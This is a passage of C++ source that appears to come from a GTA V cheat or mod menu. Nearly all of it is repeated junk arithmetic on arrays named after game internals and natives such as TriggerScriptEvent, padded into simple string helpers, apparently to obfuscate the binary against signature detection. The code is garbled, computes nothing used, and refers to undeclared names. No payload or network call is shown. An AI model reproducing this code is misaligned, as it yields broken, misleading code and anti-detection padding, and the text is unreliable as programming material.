				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			if (string.find(textoProcurado) != std::string::npos)
				return true;
			else
				return false;
		}
		std::string ReplaceChar(std::string palavra, char letraantiga, char letranova)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
